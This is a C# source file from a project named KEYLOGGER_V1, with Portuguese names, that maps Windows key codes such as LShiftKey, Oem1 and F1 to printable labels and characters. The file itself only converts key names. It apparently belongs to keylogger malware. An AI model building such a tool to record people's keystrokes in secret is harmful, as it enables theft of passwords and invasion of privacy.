using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace KEYLOGGER_V1
{
    class Mapeamento
    {
        IList<Tecla> teclas = new List<Tecla>();
        Tecla t;

        public Tecla mapeamento(string key)
        {
            return addTecla(key);
        }

        // adicionar
        private Tecla addTecla(string key)
        {
            Tecla adicionado = identificar(key);
            teclas.Add(adicionado);
            return adicionado;
        }

        //identificar
        private Tecla identificar(string key)
        {



            switch (key)
            {

                case "LWin":

                    return new Tecla("LWin", "[Win]", "");


                case "LControlKey":

                    return new Tecla("LControlKey", "[Ctrl]", "");


                case "RControlKey":

                    return new Tecla("RControlKey", "[Ctrl]", "");

                case "LMenu":

                    return new Tecla("LMenu", "[Alt]", "");

                case "RMenu":

                    return new Tecla("RMenu", "[Alt]", "");


                case "Return":

                    return new Tecla("Return", "[Enter]", "\n"); // pula linha 

                case "Space":
                    return new Tecla("Space", "[Space]", " ");

                case "LShiftKey":
                    return new Tecla("LShiftKey", "[Shift]", "");

                case "RShiftKey":
                    return new Tecla("RShiftKey", "[Shift]", "");

                case "Capital":
                    return new Tecla("Capital", "[Shift]", "");

                case "Tab":
                    return new Tecla("Tab", "[Tab]", "    ");

                case "Oemtilde":
                    return new Tecla("Oemtilde", "'", "'");

                case "Escape":
                    return new Tecla("Escape", "[Esc]", "");

                case "Back":
                    return new Tecla("Back", "[Back]", "");

                case "PrintScreen":
                    return new Tecla("PrintScreen", "[Print Screen]", "");

                case "Pause":
                    return new Tecla("Pause", "[Pause Break]", "");

                case "Insert":
                    return new Tecla("Insert", "[Insert]", "");

                case "Delete":
                    return new Tecla("Delete", "[Delete]", ""); // ápagar uma tecla para traz

                case "Home":
                    return new Tecla("Home", "[Home]", "");

                case "PageUp":
                    return new Tecla("PageUp", "[Page Up]", "");

                case "Next":
                    return new Tecla("Next", "[Page Down]", "");

                case "End":
                    return new Tecla("End", "[End]", "");

                case "Apps":
                    return new Tecla("Apps", "[Menu]", "");

                case "Up":
                    return new Tecla("Up", "[Up]", "");

                case "Down":
                    return new Tecla("Down", "[Down]", "");

                case "Right":
                    return new Tecla("Right", "[Right]", "");

                case "Left":
                    return new Tecla("Left", "[Left]", "");

                case "Oemplus":
                    return new Tecla("Oemplus", "=", "=");

                case "OemMinus":
                    return new Tecla("OemMinus", "-", "-");

                case "Oem6":
                    return new Tecla("Oem6", "[", "[");

                case "Oem5":
                    return new Tecla("Oem5", "]", "]");

                case "Oem7":
                    return new Tecla("Oem7", "", "");

                case "OemOpenBrackets":
                    return new Tecla("OemOpenBrackets", "´", "´");

                case "Oem1":
                    return new Tecla("Oem1", "Ç", "Ç");

                case "Oemcomma":
                    return new Tecla("Oemcomma", ",", ",");

                case "OemPeriod":
                    return new Tecla("OemPeriod", ".", ".");

                case "OemQuestion":
                    return new Tecla("OemQuestion", ";", ";");

                case "D1":
                    return new Tecla("D1", "1", "1");

                case "D2":
                    return new Tecla("D2", "2", "2");

                case "D3":
                    return new Tecla("D3", "3", "3");

                case "D4":
                    return new Tecla("D4", "4", "4");

                case "D5":
                    return new Tecla("D5", "5", "5");

                case "D6":
                    return new Tecla("D6", "6", "6");

                case "D7":
                    return new Tecla("D7", "7", "7");

                case "D8":
                    return new Tecla("D8", "8", "8");

                case "D9":
                    return new Tecla("D9", "9", "9");

                case "D0":
                    return new Tecla("D0", "0", "0");

                case "F1":
                    return new Tecla("F1", "[F1]", "");

                case "F2":
                    return new Tecla("F2", "[F2]", "");

                case "F3":
                    return new Tecla("F3", "[F3]", "");

                case "F4":
                    return new Tecla("F4", "[F4]", "");

                case "F5":
                    return new Tecla("F5", "[F5]", "");

                case "F6":
                    return new Tecla("F6", "[F6]", "");

                case "F7":
                    return new Tecla("F7", "[F7]", "");

                case "F8":
                    return new Tecla("F8", "[F8]", "");

                case "F9":
                    return new Tecla("F9", "[F9]", "");

                case "F10":
                    return new Tecla("F10", "[F10]", "");

                case "F11":
                    return new Tecla("F11", "[F11]", "");

                case "F12":
                    return new Tecla("F12", "[F12]", "");



                default:

                    return new Tecla(key, key, key);

            }

        }
    }
}
